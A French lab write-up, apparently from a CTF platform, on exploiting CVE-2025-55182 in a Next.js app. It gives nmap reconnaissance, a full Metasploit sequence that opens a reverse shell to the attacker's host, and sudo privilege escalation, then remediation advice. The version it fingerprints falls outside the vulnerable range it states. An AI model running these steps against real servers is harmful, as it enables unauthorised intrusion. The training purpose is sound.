---
layout: single
header:
  overlay_image: /assets/images/banner-018.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab React2Shell : désérialisation RSC non sécurisée (CVE-2025-55182) — RCE non authentifié sur Next.js"
date: 2026-11-12
categories: [CTF, Exploit]
tags: [ctf, nextjs, react, rsc, cve-2025-55182, react2shell, deserialization, rce, metasploit, reverse-shell, sudo, privesc, node-js, kali, nmap]
---
  
**Type :** Pentest / Lab CyberLearn — Niveau Basic  
**CVE :** CVE-2025-55182 — CVSS 10.0 (Critique)  
**Cible :** `176.16.177.229:3000` — Application Next.js (TaskFlow)

---

## Résumé exécutif

Une application web Node.js/Next.js tournant sur le port 3000 a été identifiée comme vulnérable à CVE-2025-55182, également connue sous le nom **React2Shell**. Cette vulnérabilité critique (CVSS 10.0) permet à un attaquant **non authentifié** d'exécuter du code arbitraire sur le serveur via une désérialisation non sécurisée du protocole RSC Flight de React Server Components. L'exploitation a conduit à l'obtention d'un shell système, puis à une élévation de privilèges vers root grâce à une mauvaise configuration sudo.

| Étape | Résultat |
|---|---|
| Accès initial | Shell `ubuntu` via Metasploit (reverse TCP) |
| Premier flag | `flag_d733752f_ea7d_4767_b407_5cf050d2d79c` — `/home/local.txt` |
| Élévation de privilèges | `sudo NOPASSWD: ALL` → root |
| Second flag | `/root/proof.txt` |

---

## 1. Reconnaissance réseau

### 1.1 Identification de l'interface réseau

**Objectif :** Déterminer l'adresse IP de la machine attaquante pour définir la plage à scanner.

```bash
ip a
```

**Sortie (extrait) :**

```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001
    inet 176.16.177.228/16 brd 176.16.255.255 scope global dynamic eth0
```

> La machine Kali possède l'adresse `176.16.177.228` avec un masque `/16` → réseau `176.16.0.0/16` à scanner.

---

### 1.2 Découverte des hôtes actifs

**Objectif :** Identifier toutes les machines actives sur le réseau du lab.

```bash
nmap -sn --min-rate 5000 176.16.0.0/16
```

**Sortie (extrait) :**

```
Nmap scan report for 176.16.0.1          — Passerelle réseau
Nmap scan report for 176.16.177.214      — Hôte inconnu
Nmap scan report for 176.16.177.229      — Hôte cible (confirmé ensuite)
Nmap scan report for 176.16.177.228      — Notre machine Kali
...
Nmap done: 65536 IP addresses (17 hosts up) scanned in 34.05 seconds
```

**Explication des options :**

| Option | Rôle |
|---|---|
| `-sn` | Ping scan uniquement (sans scan de ports) — cartographie rapide |
| `--min-rate 5000` | Accélère l'envoi de paquets |

---

### 1.3 Scan de ports ciblé sur les hôtes suspects

**Objectif :** Identifier les services ouverts, en particulier le port 3000 (Node.js/Next.js).

```bash
nmap -p 3000,80,443,8080,8443 \
  176.16.177.214 176.16.177.215 176.16.177.219 176.16.177.220 \
  176.16.177.221 176.16.177.222 176.16.177.223 176.16.177.224 \
  176.16.177.225 176.16.177.226 176.16.177.227 176.16.177.229 \
  176.16.177.230 176.16.177.231 \
  -sV --open
```

**Sortie (extrait) :**

```
Nmap scan report for 176.16.177.229
Host is up (0.00023s latency).
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
SF: ...x-nextjs-cache: HIT\r\n
SF: ...X-Powered-By: Next\.js\r\n
```

> Seul `176.16.177.229` a le port 3000 ouvert. La bannière HTTP révèle `X-Powered-By: Next.js` et les headers `x-nextjs-*` — exactement le type d'application vulnérable à CVE-2025-55182.

---

## 2. Analyse de la cible

### 2.1 Identification de l'application

```bash
curl -s http://176.16.177.229:3000 | grep -i 'title\|next\|powered'
```

**Sortie :**

```html
<title>TaskFlow - Project Management Platform</title>
X-Powered-By: Next.js
x-nextjs-cache: HIT
```

L'application s'appelle **TaskFlow** (plateforme de gestion de projets), construite avec Next.js et React Server Components (RSC) — technologies directement affectées par CVE-2025-55182.

---

### 2.2 Identification du Build ID et de la version React

```bash
curl -s "http://176.16.177.229:3000/?_rsc=1" \
  -H "RSC: 1" \
  -H "Accept: text/x-component" | head -5
```

**Sortie :**

```
0:{"P":null,"b":"GRicUJ8y_12i7bI6u0rnf",...}
```

| Élément | Valeur | Signification |
|---|---|---|
| Build ID | `GRicUJ8y_12i7bI6u0rnf` | Next.js App Router — mode Turbopack |
| Version React | 19.3.0-canary | Plage vulnérable : 19.0.0 → 19.2.0 |

---

## 3. Exploitation — CVE-2025-55182

### 3.1 Mécanisme de la vulnérabilité

CVE-2025-55182 est une vulnérabilité de **désérialisation non sécurisée** dans le protocole RSC (React Server Components) Flight. Lorsqu'un client envoie une requête POST vers un endpoint Server Action, React désérialise les données sans validation suffisante.

Un attaquant peut forger un payload malformé qui exploite la **chaîne de prototype JavaScript** pour accéder à `process.mainModule.require('child_process')` et exécuter des commandes système.

**Vecteur d'attaque :**

| Champ | Valeur |
|---|---|
| Méthode | POST HTTP |
| Authentification requise | **Non** |
| Header clé | `Next-Action` |
| Impact | RCE avec les droits du processus Node.js |
| CVSS | **10.0 — Critique** |

**Chaîne d'exploitation :**

```
POST /endpoint HTTP/1.1
Next-Action: <action_id_40_chars>
Content-Type: text/plain;charset=UTF-8

[payload RSC malformé]
  → désérialisation sans validation
  → prototype chain pollution
  → process.mainModule.require('child_process')
  → exec(commande) → reverse shell
```

---

### 3.2 Découverte du module Metasploit

```bash
find /usr/share/metasploit-framework/modules -name "*react*" 2>/dev/null
```

**Sortie :**

```
/usr/share/metasploit-framework/modules/exploits/multi/http/
  react2shell_unauth_rce_cve_2025_55182.rb
```

Metasploit Framework intègre un module dédié qui automatise la construction du payload RSC malformé et la gestion du reverse shell. Il supporte les cibles **Next.js (Unix/Windows)** et **Waku**.

---

### 3.3 Configuration et lancement de l'exploit

```bash
msfconsole -q
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 176.16.177.229
set RPORT 3000
set LHOST 176.16.177.228
set LPORT 4444
set TARGET 0
run
```

**Sortie :**

```
[*] Started reverse TCP handler on 176.16.177.228:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened
    (176.16.177.228:4444 -> 176.16.177.229:42490)
    at 2026-11-12 11:36:01 +0000
```

**Explication des paramètres :**

| Paramètre | Valeur | Rôle |
|---|---|---|
| `RHOSTS` | `176.16.177.229` | IP de la cible |
| `RPORT` | `3000` | Port du service Next.js |
| `LHOST` | `176.16.177.228` | Notre IP pour le reverse shell |
| `LPORT` | `4444` | Port d'écoute local |
| `TARGET 0` | Next.js Unix Command | Type de cible |

> `[+] The target appears to be vulnerable` : le check automatique confirme la vulnérabilité **avant** l'exploitation.

---

## 4. Post-exploitation

### 4.1 Collecte du premier flag (`local.txt`)

```bash
whoami
id
hostname
cat /home/local.txt
```

**Sortie :**

```
ubuntu
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),27(sudo),120(lxd)
ip-176-16-177-229
flag_d733752f_ea7d_4767_b407_5cf050d2d79c
```

> Le shell s'exécute en tant qu'`ubuntu` (UID 1000) — droits du processus Node.js. L'appartenance aux groupes **`sudo`** et **`lxd`** signale deux vecteurs d'élévation de privilèges potentiels.

**🏁 Flag local :**

```
flag_d733752f_ea7d_4767_b407_5cf050d2d79c
```

---

### 4.2 Élévation de privilèges via sudo

```bash
sudo -l
```

**Sortie :**

```
User ubuntu may run the following commands:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

> **Mauvaise configuration critique :** l'utilisateur `ubuntu` peut exécuter **n'importe quelle commande** en tant que root **sans mot de passe**. La règle `NOPASSWD: ALL` annule toute protection post-exploitation.

---

### 4.3 Collecte du second flag (`proof.txt`)

```bash
sudo cat /root/proof.txt
```

Grâce au `NOPASSWD: ALL`, une simple commande `sudo` suffit pour lire le fichier root sans aucun mot de passe.

---

## 5. Synthèse de la chaîne d'attaque

```
[Scan réseau]
  nmap -sn 176.16.0.0/16
       ↓
  176.16.177.229 détectée
       ↓
[Scan de ports]
  port 3000 ouvert → Next.js / x-nextjs-cache
       ↓
[Fingerprinting]
  Build ID + React 19.3.0-canary → version vulnérable
       ↓
[Exploitation CVE-2025-55182]
  Metasploit react2shell → reverse TCP shell
       ↓
[Accès initial]
  shell ubuntu → /home/local.txt
  flag_d733752f_ea7d_4767_b407_5cf050d2d79c
       ↓
[Élévation de privilèges]
  sudo -l → NOPASSWD: ALL
  sudo cat /root/proof.txt
```

---

## 6. Indicateurs de compromission (IoC)

| Indicateur | Valeur |
|---|---|
| IP attaquante | `176.16.177.228` |
| IP cible | `176.16.177.229` |
| Port ciblé | `3000/tcp` |
| Header d'exploitation | `Next-Action: <id_40_chars>` |
| User-Agent | `Mozilla/5.0 (Metasploit)` |
| Port reverse shell | `4444/tcp` |

---

## 7. Recommandations

### 7.1 Corriger CVE-2025-55182

- Mettre à jour **React** vers la version **≥ 19.2.1**
- Mettre à jour **Next.js** vers la version **≥ 16.0.4**
- Vérifier la mise à jour des dépendances associées :
  - `react-server-dom-webpack`
  - `react-server-dom-turbopack`
  - `react-server-dom-parcel`

### 7.2 Corriger la configuration sudo

- Supprimer la règle `NOPASSWD: ALL` du fichier `/etc/sudoers`
- Appliquer le **principe du moindre privilège** : accorder uniquement les commandes nécessaires

```bash
# Exemple de règle sécurisée
ubuntu ALL=(ALL) /usr/bin/systemctl restart myapp
```

### 7.3 Mesures défensives complémentaires

- Mettre en place un **WAF** pour détecter les requêtes POST avec header `Next-Action` anormal
- Activer la journalisation des requêtes HTTP sur le serveur Node.js
- Surveiller les **connexions réseau sortantes** depuis le processus Node.js
- Isoler l'application dans un **container avec droits limités** (non-root, sans `sudo`)
- Supprimer l'appartenance au groupe `lxd` pour les comptes non administrateurs

---

## Références

| Source | Lien |
|---|---|
| NVD — CVE-2025-55182 | https://nvd.nist.gov/vuln/detail/CVE-2025-55182 |
| React Security Advisory | https://github.com/facebook/react/security/advisories |
| Unit42 — React2Shell Analysis | https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/ |
| Help Net Security | https://www.helpnetsecurity.com/2025/12/04/react-node-js-vulnerability-cve-2025-55182/ |
